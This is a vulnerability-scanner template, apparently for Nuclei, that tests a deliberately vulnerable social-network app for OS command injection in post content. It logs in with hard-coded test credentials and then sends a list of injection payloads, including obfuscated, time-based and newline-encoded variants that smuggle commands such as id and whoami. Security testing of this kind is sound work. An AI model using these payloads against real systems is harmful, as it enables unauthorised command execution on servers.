id: vuln-sns-posts-command-injection
info:
  name: Vuln SNS Posts - OS Command Injection
  author: claude
  severity: critical
  description: |
    Tests for OS command injection vulnerabilities in posts content.
  reference:
    - https://owasp.org/www-community/attacks/Command_Injection
  tags: vuln-sns,rce,command-injection,posts

http:
  - raw:
      - |
        POST /api/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"user_id":"alice","password":"alice"}
        
      - |
        POST /api/posts HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Authorization: Bearer {{token}}
        
        {"content":"{{payload}}"}

    payloads:
      payload:
        # Basic command injection
        - "test;id"
        - "test|whoami"
        - "test`id`"
        - "test$(whoami)"
        - "test;uname -a"
        - "test&&hostname"
        - "test||pwd"
        # Encoded and obfuscated
        - "test;i\x64"
        - "test;wh\x6fami"
        - "test;${IFS}id"
        - "test$IFS$9id"
        # Time-based detection
        - "test;sleep 5"
        - "test|sleep 5"
        - "test`sleep 5`"
        - "test$(sleep 5)"
        # With output redirection
        - "test;id>/tmp/test"
        - "test|id>test.txt"
        # Nested commands
        - "test;echo $(whoami)"
        - "test|echo `id`"
        # Special characters bypass
        - "test%0Aid"
        - "test%0D%0Aid"
        - "test\nid"
        - "test\rid"
        # With hashtags (SNS context)
        - "#test;id"
        - "@user$(whoami)"

    extractors:
      - type: regex
        name: token
        regex:
          - '"token":\s*"([^"]+)"'
        part: body_1
        internal: true

    matchers:
      - type: word
        words:
          - "uid="
        part: body_2
        name: command-injection-detected

      - type: word
        words:
          - "gid="
        part: body_2
        name: additional-system-info
